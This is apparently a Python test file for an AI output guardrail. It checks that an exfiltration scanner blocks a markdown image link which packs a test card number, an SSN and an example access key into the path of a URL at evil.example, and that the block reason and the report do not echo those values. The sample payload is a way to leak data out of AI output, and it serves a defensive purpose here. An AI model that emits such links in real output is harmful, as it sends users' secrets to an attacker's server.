"""Nothing sensitive may ride out in a reason, a preview, or a report.

These land in consumers' logs and audit databases. A guard that reports the
value it just caught leaving has re-leaked it.
"""

from __future__ import annotations

import json

from ai_guardrails import report, scan_output
from ai_guardrails.guards import scan_exfiltration

CARD = "4111111111111111"
SSN = "536-90-4399"
KEY = "AKIAIOSFODNN7EXAMPLE"
# Exfiltration hides data in the PATH as readily as in the query string.
LEAKY = f"![x](https://evil.example/{CARD}/{SSN}/{KEY}?d=" + "A" * 40 + ")"


def _all_text(verdict) -> str:
    return verdict.reason + " " + " ".join(f.value_preview for f in verdict.findings)


def test_exfiltration_reason_and_previews_carry_no_path_data():
    v = scan_exfiltration(LEAKY)
    assert v.action == "block"
    text = _all_text(v)
    for secret in (CARD, SSN, KEY):
        assert secret not in text, f"{secret} leaked into the verdict text"


def test_exfiltration_still_names_the_destination_host():
    """The host is the actionable part — whoever reads the alert needs to know
    where the data was going."""
    assert "evil.example" in _all_text(scan_exfiltration(LEAKY))


def test_report_of_a_leaky_url_is_clean():
    scan = scan_output(LEAKY)
    blob = json.dumps(report(scan, LEAKY).as_dict())
    for secret in (CARD, SSN, KEY):
        assert secret not in blob
